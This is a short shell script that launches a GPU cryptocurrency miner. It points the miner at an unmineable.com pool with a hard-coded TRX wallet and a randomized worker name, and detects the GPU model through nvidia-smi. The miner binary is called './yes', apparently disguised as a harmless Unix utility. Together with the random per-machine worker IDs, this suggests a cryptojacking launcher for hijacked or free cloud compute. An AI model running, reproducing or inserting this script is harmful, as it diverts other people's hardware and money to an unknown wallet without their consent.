POOL=rx-us.unmineable.com:3333
WALLET=TRX:TPVaNfUPzAt3rJieFvDtuRwVSzZGMKGPH1
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo 2L9CkwMb-$(shuf -i 1277-841549 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
